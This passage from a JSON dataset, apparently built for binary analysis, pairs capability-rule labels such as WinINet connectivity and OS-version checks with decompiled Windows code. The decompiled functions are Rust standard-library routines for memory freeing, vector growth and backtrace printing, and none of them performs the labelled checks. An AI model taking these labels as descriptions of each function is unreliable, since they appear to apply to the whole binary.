& 0x3fffffffffffffff) != 0x0)) {\n        sym.__rust_dealloc(uStack1464, 2);\n        pppppppuVar70 = pppppppuStack2080;\n        pppppppuVar42 = pppppppuStack2072;\n    }\ncode_r0x00427bfa:\n    pppppppuStack2072 = pppppppuVar42;\n    pppppppuStack2080 = pppppppuVar70;\n    bVar71 = false;\ncode_r0x00427bfc:\n    if ((auStack1560 != NULL) && (auStack1560 * 0x18 != 0)) {\n        sym.__rust_dealloc(uStack1568, 8);\n    }\n    unaff_RDI = ppppppppuVar41;\n    pppppppuVar70 = pppppppuStack2072;\n    if (((!bVar71) && (auStack1432 != 0)) && ((_auStack1432 & 0x3fffffffffffffff) != 0x0)) {\n        sym.__rust_dealloc(uStack1440, 2);\n        pppppppuVar70 = pppppppuStack2072;\n    }\n    goto code_r0x00426f23;\ncode_r0x00429827:\n    puStack1864[1] = uVar35;\n    puStack1864[2] = ppppppppuVar41;\ncode_r0x00429837:\n    *puStack1864 = 1;\ncode_r0x0042983e:\n    dbg.drop_in_place<gimli::read::dwarf::Unit<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>, usize>>\n              (&ppppppppuStack616);\n    goto code_r0x004296ef;\ncode_r0x00428c19:\n    if (uVar43 != 0) {\n        if (ppppppppuStack1896 == auStack1904) {\n            dbg.reserve_for_push<addr2line::LineSequence, alloc::alloc::Global>(&uStack1912, ppppppppuStack1896);\n        }\n        uStack1912[ppppppppuStack1896 * 4] = ppppppppuStack1856;\n        uStack1912[ppppppppuStack1896 * 4 + 1] = NULL;\n        uStack1912[ppppppppuStack1896 * 4 + 2] = pppppppuVar70;\n        uStack1912[ppppppppuStack1896 * 4 + 3] = uVar43 + pppppppuVar70;\n        _auStack1904 = CONCAT88(ppppppppuStack1896 + 1, auStack1904);\n    }\n    if (ppppppppuVar67 == NULL) goto code_r0x00428c8b;\n    goto code_r0x00428a35;\n}\n",
        "token_count": 49910
    },
    "925ddfd2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_std::backtrace_rs::symbolize::gimli::stash::Stash_::h925ddfd21a24ec06(int64_t *arg1)\n\n{\n    ulong *puVar1;\n    ulong *arg1_00;\n    \n    // core::ptr::drop_in_place<std::backtrace_rs::symbolize::gimli::stash::Stash>::h925ddfd21a24ec06\n    arg1_00 = *arg1;\n    if (arg1[2] != 0) {\n        puVar1 = arg1_00 + arg1[2] * 3;\n        do {\n            if (arg1_00[1] != 0) {\n                sym.__rust_dealloc(*arg1_00, 1);\n            }\n            arg1_00 = arg1_00 + 3;\n        } while (arg1_00 != puVar1);\n        arg1_00 = *arg1;\n    }\n    if ((arg1[1] != 0) && (arg1[1] * 0x18 != 0)) {\n        sym.__rust_dealloc(arg1_00, 8);\n    }\n    if (arg1[3] != 0) {\n        sub.KERNEL32.dll_UnmapViewOfFile(arg1[5]);\n    // WARNING: Could not recover jumptable at 0x0044121c. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg1[4]);\n        return;\n    }\n    return;\n}\n",
        "token_count": 348
    },
    "1308fb4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h1308fb4c7d4f147e(ulong *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack64;\n    ulong uStack56;\n    int64_t iStack48;\n    ulong uStack40;\n    int64_t iStack32;\n    ulong uStack24;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::h1308fb4c7d4f147e\n    uVar2 = arg2 + 1;\n    if (uVar2 != 0) {\n        iVar1 = arg1[1];\n        if (uVar2 < iVar1 * 2) {\n            uVar2 = iVar1 * 2;\n        }\n        uVar3 = 4;\n        if (4 < uVar2) {\n            uVar3 = uVar2;\n        }\n        if (iVar1 == 0) {\n            uStack24 = 0;\n        }\n        else {\n            iStack32 = iVar1 * 0x48;\n            uStack40 = *arg1;\n            uStack24 = 8;\n        }\n        dbg.finish_grow<alloc::alloc::Global>\n                  (&iStack64, SUB168(ZEXT816(uVar3) * ZEXT816(0x48), 0), \n                   (SUB168(ZEXT816(uVar3) * ZEXT816(0x48) >> 0x40, 0) == 0) << 3, &uStack40);\n        if (iStack64 == 0) {\n            *arg1 = uStack56;\n            arg1[1] = uVar3;\n            return;\n        }\n        if (iStack48 != 0) {\n            dbg.handle_alloc_error(uStack56);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 471
    },
    "3fd4e652": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_alloc::vec::Vec_addr2line::LineSequence__::h3fd4e652132f161a(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    // core::ptr::drop_in_place<alloc::vec::Vec<addr2line::LineSequence>>::h3fd4e652132f161a\n    iVar2 = *arg1;\n    iVar1 = arg1[2];\n    if (iVar1 != 0) {\n        iVar3 = 0;\n        do {\n            if (*(iVar2 + 0x18 + iVar3) != 0) {\n                sym.__rust_dealloc(*(iVar2 + 0x10 + iVar3), 8);\n            }\n            iVar3 = iVar3 + 0x20;\n        } while (iVar1 << 5 != iVar3);\n        iVar2 = *arg1;\n    }\n    if ((arg1[1] != 0) && ((arg1[1] & 0x7ffffffffffffffU) != 0)) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, iVar2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 328
    },
    "c267d374": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_alloc::vec::Vec_alloc::string::String__::hc267d3745ecb8f5a(int64_t *arg1)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    \n    // core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>::hc267d3745ecb8f5a\n    puVar2 = *arg1;\n    if (arg1[2] != 0) {\n        puVar1 = puVar2 + arg1[2] * 3;\n        do {\n            if (puVar2[1] != 0) {\n                sym.__rust_dealloc(*puVar2, 1);\n            }\n            puVar2 = puVar2 + 3;\n        } while (puVar2 != puVar1);\n        puVar2 = *arg1;\n    }\n    if ((arg1[1] != 0) && (arg1[1] * 0x18 != 0)) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, puVar2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 312
    },
    "f6ce6a0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_alloc::boxed::Box__alloc::string::String___::hf6ce6a0ceaf5a0f3(int64_t *arg1)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    \n    // core::ptr::drop_in_place<alloc::boxed::Box<[alloc::string::String]>>::hf6ce6a0ceaf5a0f3\n    if (arg1[1] != 0) {\n        puVar2 = *arg1;\n        puVar1 = puVar2 + arg1[1] * 3;\n        do {\n            if (puVar2[1] != 0) {\n                sym.__rust_dealloc(*puVar2, 1);\n            }\n            puVar2 = puVar2 + 3;\n        } while (puVar2 != puVar1);\n        if (arg1[1] != 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *arg1);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 293
    },
    "4d67e211": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_gimli::read::abbrev::Abbreviations_::h4d67e211b1071aca(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar auStack128 [8];\n    int64_t iStack120;\n    int64_t iStack112;\n    ulong uStack104;\n    int64_t iStack96;\n    int64_t iStack88;\n    ulong uStack80;\n    ulong uStack72;\n    int64_t iStack64;\n    int64_t iStack56;\n    \n    // core::ptr::drop_in_place<gimli::read::abbrev::Abbreviations>::h4d67e211b1071aca\n    iVar3 = *arg1;\n    iVar1 = arg1[2];\n    if (iVar1 != 0) {\n        iVar4 = 0;\n        do {\n            if (((*(iVar3 + 8 + iVar4) != 0) && (uVar2 = *(iVar3 + 0x18 + iVar4),  uVar2 != 0)) &&\n               ((uVar2 & 0xfffffffffffffff) != 0)) {\n                uStack80 = 0x432e02;\n                sym.__rust_dealloc(*(iVar3 + 0x10 + iVar4), 8);\n            }\n            iVar4 = iVar4 + 0x70;\n        } while (iVar1 * 0x70 - iVar4 != 0);\n        iVar3 = *arg1;\n    }\n    if ((arg1[1] != 0) && (arg1[1] * 0x70 != 0)) {\n        uStack80 = 0x432e2a;\n        sym.__rust_dealloc(iVar3, 8);\n    }\n    iVar3 = arg1[4];\n    if (iVar3 == 0) {\n        uStack104 = 2;\n        uStack72 = 2;\n    }\n    else {\n        iStack96 = arg1[3];\n        uStack104 = 0;\n        uStack72 = 0;\n        iStack88 = iVar3;\n        iStack64 = iStack96;\n        iStack56 = iVar3;\n    }\n    dbg.dying_next<u64, gimli::read::abbrev::Abbreviation, alloc::alloc::Global>\n              (&stack0xffffffffffffff80, &stack0xffffffffffffff98);\n    if (iStack120 != 0) {\n        do {\n            iVar3 = iStack112 * 0x70;\n            if (((*(iStack120 + 0x68 + iVar3) != 0) && (uVar2 = *(iStack120 + 0x78 + iVar3),  uVar2 != 0)) &&\n               ((uVar2 & 0xfffffffffffffff) != 0)) {\n                sym.__rust_dealloc(*(iStack120 + 0x70 + iVar3), 8);\n            }\n            dbg.dying_next<u64, gimli::read::abbrev::Abbreviation, alloc::alloc::Global>\n                      (&stack0xffffffffffffff80, &stack0xffffffffffffff98);\n        } while (iStack120 != 0);\n    }\n    return;\n}\n",
        "token_count": 711
    },
    "72cfa132": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * sym.std::io::stdio::OUTPUT_CAPTURE::__getit::h72cfa132fd89b34c(void)\n\n{\n    int64_t *arg1;\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    \n    // std::io::stdio::OUTPUT_CAPTURE::__getit::h72cfa132fd89b34c\n    iVar1 = *0x443078;\n    if (*0x443078 == 0) {\n        iVar1 = dbg.lazy_init(0x443078);\n    }\n    piVar2 = sub.KERNEL32.dll_TlsGetValue(iVar1);\n    if ((piVar2 < 0x2) || (*piVar2 == 0)) {\n        iVar1 = *0x443078;\n        if (*0x443078 == 0) {\n            iVar1 = dbg.lazy_init(0x443078);\n        }\n        piVar3 = sub.KERNEL32.dll_TlsGetValue(iVar1);\n        if (piVar3 == NULL) {\n            piVar3 = sym.__rust_alloc(0x18, 8);\n            if (piVar3 == NULL) {\n                dbg.handle_alloc_error(0x18);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            *piVar3 = 0;\n            piVar3[2] = 0x443078;\n            iVar1 = *0x443078;\n            if (*0x443078 == 0) {\n                iVar1 = dbg.lazy_init(0x443078);\n            }\n            sub.KERNEL32.dll_TlsSetValue(iVar1, piVar3);\n        }\n        else if (piVar3 == 0x1) {\n            return NULL;\n        }\n        piVar2 = piVar3 + 1;\n        arg1 = piVar3[1];\n        iVar1 = *piVar3;\n        *piVar3 = 1;\n        piVar3[1] = 0;\n        if ((iVar1 != 0) && (arg1 != NULL)) {\n            LOCK();\n            *arg1 = *arg1 + -1;\n            if (*arg1 == 0) {\n                dbg.drop_slow<std::sync::mutex::Mutex<alloc::vec::Vec<u8, alloc::alloc::Global>>>(arg1);\n            }\n        }\n    }\n    else {\n        piVar2 = piVar2 + 1;\n    }\n    return piVar2;\n}\n",
        "token_count": 534
    },
    "f4f2cece": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong sym._std::sys_common::backtrace::_print::DisplayBacktrace_as_core::fmt::Display_::fmt::hf4f2cece63ea17af\n                (uint8_t *arg1, int64_t arg2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    code *pcVar5;\n    ulong uVar6;\n    uint64_t uVar7;\n    uint64_t arg2_00;\n    uint64_t uVar8;\n    uint64_t arg1_00;\n    ulong *arg1_01;\n    ulong *arg2_01;\n    bool bVar9;\n    uint8_t uStack1771;\n    char cStack1770;\n    uchar uStack1769;\n    uint64_t uStack1768;\n    ulong uStack1760;\n    uint64_t uStack1752;\n    int64_t iStack1744;\n    ulong *puStack1736;\n    uchar auStack1728 [16];\n    char *pcStack1712;\n    ulong *puStack1704;\n    uint64_t uStack1696;\n    uint uStack1688;\n    uint uStack1684;\n    uint uStack1680;\n    uint uStack1676;\n    uint8_t uStack1672;\n    ulong uStack1664;\n    uint64_t uStack1656;\n    int64_t iStack1648;\n    uchar auStack1640 [16];\n    uchar auStack1624 [16];\n    uchar auStack1608 [16];\n    uchar auStack1592 [16];\n    uchar auStack1576 [16];\n    uchar auStack1560 [16];\n    uchar auStack1544 [16];\n    uchar auStack1528 [16];\n    uchar auStack1512 [16];\n    uchar auStack1496 [16];\n    uchar auStack1480 [16];\n    uchar auStack1464 [16];\n    uchar auStack1448 [16];\n    uchar auStack1432 [16];\n    uchar auStack1416 [16];\n    uchar auStack1400 [16];\n    ulong uStack1384;\n    ulong uStack1376;\n    ulong uStack1368;\n    ulong uStack1360;\n    uint64_t *puStack1352;\n    ulong uStack1344;\n    uint8_t uStack1336;\n    uint uStack1320;\n    uint uStack1316;\n    uint uStack1312;\n    uint uStack1308;\n    ulong uStack1304;\n    ulong uStack1296;\n    ulong uStack1288;\n    char *pcStack1272;\n    ulong uStack1264;\n    ulong uStack1152;\n    uint64_t uStack1144;\n    int64_t iStack1056;\n    \n    // <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt::hf4f2cece63ea17af\n    uStack1771 = *arg1;\n    uStack1752 = uStack1752 & 0xffffffffffffff00 | uStack1771;\n    uVar8 = 0;\n    iStack1744 = arg2;\n    sub.msvcrt.dll_memset(&uStack1304, 0);\n    puStack1736 = 0x2;\n    auStack1728 = ZEXT816(0);\n    uVar7 = 0x200;\n    arg1_01 = 0x2;\ncode_r0x00437fe0:\n    arg2_00 = 0x200;\n    arg2_01 = &uStack1304;\n    do {\n        sub.KERNEL32.dll_SetLastError();\n        uVar2 = sub.KERNEL32.dll_GetCurrentDirectoryW(uVar7 & 0xffffffff, arg2_01);\n        if ((uVar2 == 0) && (iVar3 = sub.KERNEL32.dll_GetLastError(),  iVar3 != 0)) {\n            uVar2 = sub.KERNEL32.dll_GetLastError();\n            uStack1696 = uVar2 << 0x20 | 2;\n            bVar9 = false;\ncode_r0x0043807e:\n            if ((auStack1728._0_8_ != 0) && ((auStack1728 & 0x7fffffffffffffff) != 0x0)) {\n                sym.__rust_dealloc(arg1_01, 2);\n            }\n            if (bVar9) {\n                uStack1320 = uStack1368;\n                uStack1316 = uStack1368._4_4_;\n                uStack1312 = uStack1360;\n                uStack1308 = uStack1360._4_4_;\n            }\n            else {\n                dbg.drop_in_place<std::io::error::Error>(uStack1696);\n                uStack1696 = 0;\n                uStack1752._0_1_ = uStack1771;\n            }\n            uStack1688 = uStack1320;\n            uStack1684 = uStack1316;\n            uStack1680 = uStack1312;\n            uStack1676 = uStack1308;\n            uStack1304 = 0x44a808;\n            uStack1296 = 1;\n            uStack1288 = 0;\n            pcStack1272 = \n            \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n            ;\n            uStack1264 = 0;\n            uStack1672 = uStack1752;\n            cVar1 = sym.core::fmt::Formatter::write_fmt::h489385595d20438a\n                              (*(iStack1744 + 0x20), *(iStack1744 + 0x28), &uStack1304);\n            if (cVar1 != '\\0') goto code_r0x0043852b;\n            uStack1368 = iStack1744;\n            uStack1360 = 0;\n            uStack1336 = uStack1771;\n            puStack1352 = &uStack1696;\n            uStack1344 = 0x44a818;\n            uStack1769 = uStack1771 != 0;\n            uStack1664 = 0;\n            cStack1770 = '\\0';\n            puStack1736 = &uStack1771;\n            auStack1728 = CONCAT88(&uStack1769, &uStack1664);\n            pcStack1712 = &cStack1770;\n            puStack1704 = &uStack1368;\n            uStack1752 = sub.KERNEL32.dll_GetCurrentProcess();\n            uVar4 = sub.KERNEL32.dll_GetCurrentThread();\n            sub.msvcrt.dll_memset(&uStack1304, 0, 0x4d0);\n            sub.ntdll.dll_RtlCaptureContext(&uStack1304);\n            uVar7 = *0x4520d0;\n            if (*0x4520d0 == 0) {\n                uVar7 = sub.KERNEL32.dll_CreateMutexA(0, 0, \"Local\\\\RustBacktraceMutex\");\n                if (uVar7 == 0) goto code_r0x00438524;\n                LOCK();\n                bVar9 = *0x4520d0 == 0;\n                *0x4520d0 = *0x4520d0 ^ bVar9 * (*0x4520d0 ^ uVar7);\n                uVar8 = !bVar9 * *0x4520d0;\n                if (!bVar9) {\n                    sub.KERNEL32.dll_CloseHandle(uVar7);\n                    uVar7 = uVar8;\n                }\n            }\n            sub.KERNEL32.dll_WaitForSingleObjectEx(uVar7, 0xffffffff, 0);\n            if ((*0x452130 == 0) && (*0x452130 = sub.KERNEL32.dll_LoadLibraryA(\"dbghelp.dll\"),  *0x452130 == 0)) {\n                fcn.004410dc(uVar7);\n                goto code_r0x00438524;\n            }\n            if (*0x4520d8 == '\\0') {\n                pcVar5 = *0x452138;\n                if ((*0x452138 == NULL) &&\n                   (pcVar5 = sub.KERNEL32.dll_GetProcAddress(*0x452130, \"SymGetOptions\"),  pcVar5 == NULL)) {\n                    uStack1768 = uVar7;\n                    dbg.panic(0x44bcbb, 0x2b, 0x44af00);\n                    goto code_r0x004388b2;\n                }\n                *0x452138 = pcVar5;\n                uVar2 = (**0x452138)();\n                pcVar5 = *0x452140;\n                if ((*0x452140 == NULL) &&\n                   (pcVar5 = sub.KERNEL32.dll_GetProcAddress(*0x452130, \"SymSetOptions\"),  pcVar5 == NULL)) {\n                    uStack1768 = uVar7;\n                    dbg.panic(0x44bcbb, 0x2b, 0x44af18);\n                    goto code_r0x004388b2;\n                }\n                *0x452140 = pcVar5;\n                (**0x452140)(uVar2 | 4);\n                pcVar5 = *0x452148;\n                if ((*0x452148 == NULL) &&\n                   (pcVar5 = sub.KERNEL32.dll_GetProcAddress(*0x452130, \"SymInitializeW\"),  pcVar5 == NULL)) {\n                    uStack1768 = uVar7;\n                    dbg.panic(0x44bcbb, 0x2b, 0x44af30);\n                    goto code_r0x004388b2;\n                }\n                *0x452148 = pcVar5;\n                pcVar5 = *0x452148;\n                uVar6 = sub.KERNEL32.dll_GetCurrentProcess();\n                (*pcVar5)(uVar6, 0, 1);\n                *0x4520d8 = '\\x01';\n            }\n            sub.KERNEL32.dll_GetCurrentProcess();\n            pcVar5 = *0x452158;\n            if ((*0x452158 != NULL) ||\n               (pcVar5 = sub.KERNEL32.dll_GetProcAddress(*0x452130, \"StackWalkEx\"),  pcVar5 != NULL)) {\n                *0x452158 = pcVar5;\n                pcVar5 = *0x452158;\n                auStack1400 = ZEXT816(0);\n                auStack1416 = ZEXT816(0);\n                auStack1432 = ZEXT816(0);\n                auStack1448 = ZEXT816(0);\n                auStack1464 = ZEXT816(0);\n                auStack1480 = ZEXT816(0);\n                auStack1496 = ZEXT816(0);\n                auStack1512 = ZEXT816(0);\n                auStack1528 = ZEXT816(0);\n                auStack1544 = ZEXT816(0);\n                auStack1560 = ZEXT816(0);\n                auStack1576 = ZEXT816(0);\n                uStack1656 = 0;\n                uStack1384 = 0x110;\n                uStack1376 = 0;\n                iStack1648 = iStack1056;\n                auStack1640 = ZEXT816(0x300000000);\n                auStack1592 = ZEXT816(0x300000000);\n                auStack1624 = ZEXT816(uStack1144) << 0x40;\n                auStack1608 = CONCAT88(uStack1152, 0x300000000);\n                uStack1768 = uVar7;\n                goto code_r0x00438490;\n            }\n            auStack1400 = ZEXT816(0);\n            auStack1416 = ZEXT816(0);\n            auStack1432 = ZEXT816(0);\n            auStack1448 = ZEXT816(0);\n            auStack1464 = ZEXT816(0);\n            auStack1480 = ZEXT816(0);\n            auStack1496 = ZEXT816(0);\n            auStack1512 = ZEXT816(0);\n            auStack1528 = ZEXT816(0);\n            auStack1544 = ZEXT816(0);\n            auStack1560 = ZEXT816(0);\n            auStack1576 = ZEXT816(0);\n            uStack1656 = 1;\n            uStack1376 = 0;\n            iStack1648 = iStack1056;\n            auStack1640 = ZEXT816(0x300000000);\n            auStack1592 = ZEXT816(0x300000000);\n            auStack1624 = ZEXT816(uStack1144) << 0x40;\n            auStack1608 = CONCAT88(uStack1152, 0x300000000);\n            break;\n        }\n        arg1_00 = uVar2;\n        bVar9 = arg1_00 <= uVar7;\n        if (uVar7 == arg1_00) {\n            iVar3 = sub.KERNEL32.dll_GetLastError();\n            if (iVar3 != 0x7a) {\n                dbg.panic(\"internal error: entered unreachable codeC:\\\\Users\\\\Anonymous\\\\.cargo\\\\registry\\\\src\\\\github.com-1ecc6299db9ec823\\\\rayon-core-1.9.3\\\\src\\\\job.rs\"\n                          , 0x28, 0x44b538);\n                goto code_r0x004388b2;\n            }\n            uVar7 = uVar7 * 2;\n        }\n        else {\n            uVar7 = arg1_00;\n            if (bVar9) {\n                if (arg1_00 <= arg2_00) {\n                    dbg.from_wide(&uStack1656, arg2_01, arg1_00);\n                    uStack1368 = iStack1648;\n                    uStack1360 = SUB168(auStack1640, 0);\n                    bVar9 = true;\n                    uStack1696 = uStack1656;\n                    goto code_r0x0043807e;\n                }\n                dbg.slice_end_index_len_fail(arg1_00, arg2_00);\n                goto code_r0x004388b2;\n            }\n        }\n        if (uVar7 < 0x201) goto code_r0x00437fe0;\n        if (auStack1728._0_8_ - uVar8 < uVar7 - uVar8) {\n            dbg.do_reserve_and_handle<u16, alloc::alloc::Global>(&puStack1736, uVar8, uVar7 - uVar8);\n            arg1_01 = puStack1736;\n        }\n        auStack1728 = CONCAT88(uVar7, auStack1728._0_8_);\n        arg2_00 = uVar7;\n        uVar8 = uVar7;\n        arg2_01 = arg1_01;\n    } while( true );\n    while( true ) {\n        uStack1760 = 0;\n        sub.ntdll.dll_RtlLookupFunctionEntry(iStack1648, &uStack1760, 0);\n        uStack1376 = uStack1760;\n        cVar1 = sym.std::sys_common::backtrace::_print_fmt::__u7b__u7b_closure_u7d__u7d_::had12663f973ba5a2\n                          (&puStack1736, &uStack1656);\n        if (cVar1 == '\\0') break;\n        pcVar5 = *0x452150;\n        if ((*0x452150 == NULL) && (pcVar5 = sub.KERNEL32.dll_GetProcAddress(*0x452130, \"StackWalk64\"),  pcVar5 == NULL)\n           ) {\n            uStack1768 = uVar7;\n            dbg.panic(0x44bcbb, 0x2b, 0x44ba58);\ncode_r0x004388b2:\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        *0x452150 = pcVar5;\n        iVar3 = (**0x452150)(0x8664, uStack1752, uVar4, &iStack1648, &uStack1304, 0, dbg.function_table_access, \n                             sym.std::backtrace_rs::backtrace::dbghelp::trace::get_module_base::he9095441fa81ee6f, 0);\n        if (iVar3 != 1) break;\n    }\n    goto code_r0x00438515;\n    while( true ) {\n        uStack1760 = 0;\n        sub.ntdll.dll_RtlLookupFunctionEntry(iStack1648, &uStack1760, 0);\n        uStack1376 = uStack1760;\n        cVar1 = sym.std::sys_common::backtrace::_print_fmt::__u7b__u7b_closure_u7d__u7d_::had12663f973ba5a2\n                          (&puStack1736, &uStack1656);\n        uVar7 = uStack1768;\n        if (cVar1 == '\\0') break;\ncode_r0x00438490:\n        iVar3 = (*pcVar5)(0x8664, uStack1752, uVar4, &iStack1648, &uStack1304, 0, dbg.function_table_access, \n                          sym.std::backtrace_rs::backtrace::dbghelp::trace::get_module_base::he9095441fa81ee6f, 0, 0);\n        uVar7 = uStack1768;\n        if (iVar3 != 1) break;\n    }\ncode_r0x00438515:\n    fcn.004410dc(uVar7);\ncode_r0x00438524:\n    if (cStack1770 == '\\0') {\n        if (uStack1771 == 0) {\n            uStack1304 = 0x44a898;\n            uStack1296 = 1;\n            uStack1288 = 0;\n            pcStack1272 = \n            \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n            ;\n            uStack1264 = 0;\n            cVar1 = sym.core::fmt::Formatter::write_fmt::h489385595d20438a\n                              (*(iStack1744 + 0x20), *(iStack1744 + 0x28), &uStack1304);\n            if (cVar1 != '\\0') goto code_r0x0043852b;\n        }\n        if ((uStack1696 != 0) && (CONCAT44(uStack1684, uStack1688) != 0)) {\n            sym.__rust_dealloc(uStack1696, 1);\n        }\n        uVar4 = 0;\n    }\n    else {\ncode_r0x0043852b:\n        if ((uStack1696 != 0) && (CONCAT44(uStack1684, uStack1688) != 0)) {\n            sym.__rust_dealloc(uStack1696, 1);\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 4222
    },
    "ad12663f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t sym.std::sys_common::backtrace::_print_fmt::__u7b__u7b_closure_u7d__u7d_::had12663f973ba5a2\n                   (char **arg1, int64_t arg2)\n\n{\n    uint *puVar1;\n    int16_t *piVar2;\n    int64_t iVar3;\n    int16_t *piVar4;\n    char cVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    char **arg1_00;\n    char *pcVar9;\n    char *pcVar10;\n    int64_t iVar11;\n    uint64_t uVar12;\n    char *pcVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    ulong var_8h;\n    ulong var_10h;\n    ulong var_18h;\n    ulong var_20h;\n    char cStack1498;\n    char cStack1497;\n    ulong uStack1496;\n    uchar auStack1488 [8];\n    int64_t iStack1480;\n    int64_t iStack1472;\n    int64_t iStack1464;\n    int64_t iStack1456;\n    ulong uStack1448;\n    ulong uStack1440;\n    ulong uStack1432;\n    ulong uStack1424;\n    uchar auStack1416 [8];\n    uint uStack1408;\n    uint uStack1404;\n    int64_t iStack1400;\n    uint uStack1392;\n    uint uStack1388;\n    uint uStack1384;\n    uint uStack1380;\n    int16_t *piStack1376;\n    uint uStack1368;\n    uint uStack1364;\n    uint uStack1360;\n    uint uStack1356;\n    int64_t *piStack1352;\n    ulong uStack1336;\n    int64_t *piStack1328;\n    int64_t iStack1320;\n    char **ppcStack1312;\n    char *pcStack1304;\n    char *pcStack1296;\n    char *pcStack1288;\n    char *pcStack1280;\n    char *pcStack1272;\n    char *pcStack1264;\n    char *pcStack1256;\n    char *pcStack1248;\n    char *pcStack1240;\n    char *pcStack1232;\n    int64_t iStack1224;\n    ulong uStack1216;\n    uint32_t uStack1208;\n    uint uStack1204;\n    uint uStack1200;\n    uint uStack1196;\n    char **ppcStack1192;\n    ulong uStack1184;\n    uint auStack1176 [4];\n    ulong uStack1160;\n    uint uStack1152;\n    uint uStack1148;\n    uint32_t uStack1144;\n    uint uStack1140;\n    ulong 